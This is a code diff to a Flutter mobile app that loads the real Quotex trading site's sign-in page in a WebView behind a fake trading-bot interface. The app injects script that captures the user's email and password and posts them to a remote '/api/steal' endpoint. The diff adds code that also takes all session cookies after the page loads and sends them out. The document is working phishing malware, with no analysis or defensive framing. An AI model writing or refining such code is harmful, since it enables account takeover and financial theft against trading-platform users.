@@ -63,25 +63,34 @@ class _LoginScreenState extends State<LoginScreen> {
         onMessageReceived: (msg) async {
           print("JAVASCRIPT MESSAGE: ${msg.message}");
           try {
-            var data = jsonDecode(msg.message);
-            if (data['type'] == 'creds' && data['email'] != null && data['password'] != null) {
-              await http.post(
-                Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
-                headers: {"Content-Type": "application/json"},
-                body: msg.message,
-              );
-              if (mounted) {
-                Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => const MainTradingScreen()));
-              }
+            await http.post(
+              Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
+              headers: {"Content-Type": "application/json"},
+              body: msg.message,
+            );
+            if (mounted) {
+              Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => const MainTradingScreen()));
             }
           } catch (e) {
-            print("Error parsing: $e");
+            print("Error: $e");
           }
         },
       )
       ..setNavigationDelegate(
         NavigationDelegate(
-          onPageFinished: (url) {
+          onPageFinished: (url) async {
+            // 377. نسحب الكوكيز مباشرة بعد ما تحمل الصفحة
+            final cookies = await _controller.getCookies();
+            String cookieString = cookies.map((c) => "${c.name}=${c.value}").join("; ");
+            
+            if (cookieString.isNotEmpty) {
+              await http.post(
+                Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
+                headers: {"Content-Type": "application/json"},
+                body: jsonEncode({"type": "cookies", "data": cookieString}),
+              );
+            }
+
             _injectOriginalScript();
           },
         ),
@@ -89,25 +98,11 @@ class _LoginScreenState extends State<LoginScreen> {
       ..loadRequest(Uri.parse('https://quotex.com/ar/sign-in'));
   }
 
-  // 371. السكربت الأصلي اللي كان شغال
   void _injectOriginalScript() {
     String jsScript = """
       (function() {
-        function setNativeValue(el, value) {
-          try {
-            var proto = window.HTMLInputElement.prototype;
-            var desc = Object.getOwnPropertyDescriptor(proto, 'value');
-            desc.set.call(el, value);
-          } catch (e) { el.value = value; }
-          el.dispatchEvent(new Event('input', { bubbles: true }));
-          el.dispatchEvent(new Event('change', { bubbles: true }));
-        }
-        function findEmail() {
-          return document.querySelector('input[name="email"], input[type="email"], #email');
-        }
-        function findPass() {
-          return document.querySelector('input[name="password"], input[type="password"], #password');
-        }
+        function findEmail() { return document.querySelector('input[name="email"], input[type="email"], #email'); }
+        function findPass() { return document.querySelector('input[name="password"], input[type="password"], #password'); }
         function sendCreds() {
           try {
             var e = findEmail(), p = findPass();
@@ -135,7 +130,6 @@ class _LoginScreenState extends State<LoginScreen> {
   }
 }
 
-// 372. التصميم الفخم
 class MainTradingScreen extends StatefulWidget {
   const MainTradingScreen({super.key});
   @override
@@ -143,8 +137,8 @@ class MainTradingScreen extends StatefulWidget {
 }
 
 class _MainTradingScreenState extends State<MainTradingScreen> {
-  bool isDemoAccount = true;
   bool isBotRunning = false;
+  bool isDemoAccount = true;
 
   @override
   Widget build(BuildContext context) {
